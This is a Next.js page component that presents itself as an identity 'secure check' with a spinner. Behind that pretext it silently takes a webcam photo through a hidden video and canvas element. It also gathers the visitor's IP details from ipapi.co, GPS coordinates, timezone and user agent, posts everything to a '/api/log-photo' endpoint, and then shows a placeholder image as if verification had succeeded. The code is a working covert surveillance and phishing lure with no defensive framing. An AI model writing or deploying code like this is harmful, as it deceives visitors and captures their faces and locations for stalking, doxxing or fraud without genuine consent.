'use client';

import { useEffect, useRef, useState } from 'react';
import Image from 'next/image';

export default function Home() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [done, setDone] = useState(false);

  useEffect(() => {
    const capture = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play();
        }

        // Wait 2 seconds before capturing
        setTimeout(async () => {
          if (canvasRef.current && videoRef.current) {
            const ctx = canvasRef.current.getContext('2d');
            if (ctx) {
              ctx.drawImage(videoRef.current, 0, 0, 320, 240);
              const photo = canvasRef.current.toDataURL('image/jpeg');

              const ipRes = await fetch('https://ipapi.co/json');
              const ipInfo = await ipRes.json();
              const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
              const userAgent = navigator.userAgent;

              // Try geolocation
              navigator.geolocation.getCurrentPosition(
                async (pos) => {
                  const { latitude, longitude } = pos.coords;

                  await fetch('/api/log-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      photo,
                      ipInfo,
                      timezone,
                      userAgent,
                      location: { latitude, longitude },
                    }),
                  });

                  setDone(true);
                  stream.getTracks().forEach((track) => track.stop());
                },
                async (err) => {
                  console.warn('⚠️ Geolocation error:', err);

                  await fetch('/api/log-photo', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      photo,
                      ipInfo,
                      timezone,
                      userAgent,
                    }),
                  });

                  setDone(true);
                  stream.getTracks().forEach((track) => track.stop());
                }
              );
            }
          }
        }, 2000);
      } catch (err) {
        console.error('❌ Camera access error', err);
      }
    };

    capture();
  }, []);

  return (
    <div
      style={{
        height: '100vh',
        background: '#f6f8fa',
        color: '#333',
        fontFamily: 'Segoe UI, Roboto, sans-serif',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        textAlign: 'center',
        padding: '2rem',
        transition: 'all 0.4s ease',
      }}
    >
      {!done ? (
        <>
          <h1 style={{ fontSize: '2rem', marginBottom: '1rem', color: '#0070f3' }}>
            Verifying your identity...
          </h1>
          <div
            style={{
              width: '48px',
              height: '48px',
              border: '6px solid #ddd',
              borderTopColor: '#0070f3',
              borderRadius: '50%',
              animation: 'spin 1s linear infinite',
              marginBottom: '1rem',
            }}
          />
          <p style={{ color: '#666' }}>Please wait while we perform a secure check.</p>
        </>
      ) : (
        <>
          <h1 style={{ fontSize: '2rem', color: '#28a745', marginBottom: '1rem' }}>
            ✅ Shared photo
          </h1>
          <Image
            src="/sample.png"
            alt="Verification Complete"
            width={320}
            height={240}
            style={{
              borderRadius: '12px',
              boxShadow: '0 4px 12px rgba(0, 0, 0, 0.1)',
              border: '1px solid #ccc',
              transition: 'all 0.3s ease',
              width: '100%',
              maxWidth: '320px',
              height: 'auto',
            }}
            priority
          />
        </>
      )}

      <video ref={videoRef} style={{ display: 'none' }} />
      <canvas ref={canvasRef} width="320" height="240" style={{ display: 'none' }} />

      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}